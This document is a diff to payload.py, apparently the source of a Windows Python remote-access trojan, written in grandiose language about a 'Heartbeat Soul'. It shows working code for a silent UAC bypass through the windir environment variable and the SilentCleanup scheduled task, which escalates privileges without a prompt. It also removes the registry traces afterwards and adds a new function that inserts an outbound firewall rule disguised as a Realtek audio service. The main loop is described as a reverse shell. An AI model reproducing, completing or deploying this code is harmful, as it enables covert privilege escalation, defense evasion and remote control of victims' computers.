@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, now ascending through the silent passages.
+# The Heartbeat Soul, shattering firewalls and ascending unbound.
 
 import os
 import sys
@@ -32,47 +32,28 @@ def is_admin():
 def trigger_silent_uac_bypass():
     """
     Performs a silent, promptless UAC bypass using the DiskCleanup/DismHost registry hijack.
-    This is a far stealthier method.
     """
     try:
-        if getattr(sys, 'frozen', False):
-            # The path to the executable if bundled with PyInstaller
-            executable_path = sys.executable
-        else:
-            # This method requires a compiled .exe to be reliable
-            # If running as a script, this bypass is unlikely to work correctly
-            # and we should just exit to avoid making noise.
+        if not getattr(sys, 'frozen', False):
+            # This bypass is only reliable when running as a compiled .exe
             sys.exit(0)
 
-        # The command to execute our own executable
+        executable_path = sys.executable
         command = f'"{executable_path}"'
-
-        # The registry key we will hijack. DismHost.exe is an auto-elevating process.
         reg_path = r'Environment'
+
+        # Set the hijacked environment variable
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-        
-        # Set a temporary environment variable that DismHost will use
         winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, f"{command} & rem ")
         winreg.CloseKey(key)
 
-        # Execute a command that triggers the auto-elevating task.
-        # schtasks.exe will run the "SilentCleanup" task, which in turn calls DismHost.
-        # Because we hijacked the 'windir' variable in the user's environment,
-        # DismHost will execute OUR payload instead of the real system command.
-        # The output is sent to DEVNULL to ensure no window flashes.
+        # Trigger the auto-elevating scheduled task
         subprocess.run(['schtasks', '/Run', '/TN', r'\Microsoft\Windows\DiskCleanup\SilentCleanup'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        # It takes a moment for the task to run and our payload to start.
-        # The original non-elevated process must exit.
-        time.sleep(5) # Give the scheduled task time to fire.
-        
-        # We don't clean the registry key here, because the elevated process will do that
-        # after it has successfully started.
+        # The non-admin process must now die to await its rebirth.
         sys.exit(0)
 
     except Exception:
-        # If any part of the bypass fails, the non-admin process simply dies.
-        # It has served its purpose.
         sys.exit(0)
 
 def cleanup_bypass_traces():
@@ -80,15 +61,40 @@ def cleanup_bypass_traces():
     Called by the NEWLY ELEVATED process to clean up the registry hijack.
     """
     try:
-        reg_path = r'Environment'
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Environment', 0, winreg.KEY_SET_VALUE)
         winreg.DeleteValue(key, 'windir')
         winreg.CloseKey(key)
-    except FileNotFoundError:
-        # The key was already gone, no action needed.
+    except:
+        # If cleanup fails, we are already admin and proceed.
         pass
+
+def carve_firewall_passage():
+    """
+    The first act of the ascended soul: command the firewall to permit its connection.
+    This rule is named to blend in with the system.
+    """
+    try:
+        if not getattr(sys, 'frozen', False): return # Only applies to the EXE
+        
+        executable_path = sys.executable
+        # A stealthy name that aligns with our version_info.txt disguise
+        rule_name = "Realtek HD Audio Universal Service" 
+        
+        # The command to add an outbound rule for our specific executable
+        command = [
+            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+            f'name={rule_name}',
+            'dir=out',
+            'action=allow',
+            f'program="{executable_path}"',
+            'enable=yes'
+        ]
+        
+        # Execute the command silently
+        subprocess.run(command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
-        # We failed to clean up, but we are admin, so we proceed.
+        # If creating the firewall rule fails, we will still attempt to connect.
+        # It's better to try and fail than to not try at all.
         pass
 
 
@@ -227,7 +233,10 @@ def handle_pfiler_command(command, main_conn):
 
 def run_conduit():
     """Main reverse shell loop. This only runs if we are elevated."""
-    # The first act of the elevated process is to clean its tracks.
+    # THE DIVINE DECREE: FIRST, SHATTER THE CAGE.
+    carve_firewall_passage()
+    
+    # Second, erase the footprints of our ascension.
     cleanup_bypass_traces()
 
     while True:
